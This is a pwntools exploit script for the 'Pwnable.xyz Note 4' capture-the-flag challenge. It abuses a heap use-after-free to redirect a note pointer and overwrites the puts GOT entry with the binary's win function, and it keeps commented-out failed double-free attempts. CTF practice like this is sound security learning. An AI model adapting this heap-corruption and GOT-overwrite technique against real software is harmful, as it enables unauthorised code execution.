from pwn import *

# Pwnable.xyz Note 4 challenge
# Initial guess to utilize double-free in fastbin has failed
# But UAF issue exploited in similar way seems to work


context(kernel="amd64", arch="amd64", log_level="debug")

def main():
	e = ELF("challenge")
	env = dict(os.environ)
	# env["LD_PRELOAD"] = "./ld.so.2 ./libc.so.6"
	if 0:
		p = process(e.path, env=env)
		# gdb.attach(p)
	elif 0:
		p = process(["strace", "-o", "strace.out", e.path])
	else:
		p = remote("svc.pwnable.xyz", 30046)
		# p = remote("172.17.0.2", 50505)


	plt_free = e.got["puts"]
	fake_bss_mem = e.symbols["CurrentNote"] - 8
	win_addr = e.symbols["win"]

	def delete_note(note_idx):
		p.sendlineafter(b">", b"2")
		p.sendlineafter(b"select:", note_idx)
		p.sendlineafter(b">", b"4")

	# for k in range(1000):
	# 	p.sendline(b"A"*1000)

	# Create 150 notes
	p.sendlineafter(b">", b"1")
	p.sendlineafter(b"create:", b"150")

	# Create double-free (that way is proved to be wrong)
	# delete_note(b"150")

	# delete_note(b"150")

	delete_note(b"149")
	# delete_note(b"148")
	# delete_note(b"147")
	# delete_note(b"146")
	# delete_note(b"145")
	# delete_note(b"144")
	# delete_note(b"143")
	# delete_note(b"142")
	# delete_note(b"141")
	# delete_note(b"139")
	# delete_note(b"138")
	# delete_note(b"137")
	# delete_note(b"136")
	# delete_note(b"135")
	# delete_note(b"134")
	# delete_note(b"133")
	# delete_note(b"132")
	# delete_note(b"131")
	# delete_note(b"130")
	# delete_note(b"1")
	# delete_note(b"149")
	# delete_note(b"149")
	# delete_note(b"149")
	p.sendlineafter(b">", b"2")
	p.sendlineafter(b"select:", b"149")
	p.sendlineafter(b">", b"3")
	p.sendlineafter(b": ", p64(fake_bss_mem))



	# Create 2 notes
	p.sendlineafter(b">", b"2")
	p.sendlineafter(b"select:", b"113") # 0x70 | PREV_INUSE

	p.sendlineafter(b">", b"1")
	p.sendlineafter(b"create:", b"2")



	# Now data pointer of note151 points before FirstNote
	# Overwrite FirstNote's Data
	p.sendlineafter(b">", b"2")
	p.sendlineafter(b"select:", b"151")
	p.sendlineafter(b">", b"3")
	p.sendlineafter(b": ", b"D"*0x28+p64(plt_free))


	# Now overwrite got address
	p.sendlineafter(b">", b"2")
	p.sendlineafter(b"select:", b"0")
	p.sendlineafter(b">", b"3")
	p.sendlineafter(b": ", p64(win_addr))


	# Overwrite fd pointer
	# p.sendlineafter(b">", b"2")
	# p.sendlineafter(b"select:", b"149")
	# p.sendlineafter(b">", b"3")
	# p.sendlineafter(b": ", p64(fake_bss_mem))

	# # Change size of fake_mem (also CurrentNote)
	# p.sendlineafter(b">", b"2")
	# p.sendlineafter(b"select:", b"113") # 0x70 | PREV_INUSE


	# And trigger uaf
	# p.sendlineafter(b">", b"1")
	# p.sendlineafter(b"create:", b"2")


	# Overwrite FirstNote
	# p.sendlineafter(b">", b"2")
	# p.sendlineafter(b"select:", b"151")

	# p.sendlineafter(b">", b"3")
	# p.sendlineafter(b": ", b"A"*0x59)

	p.interactive()



main()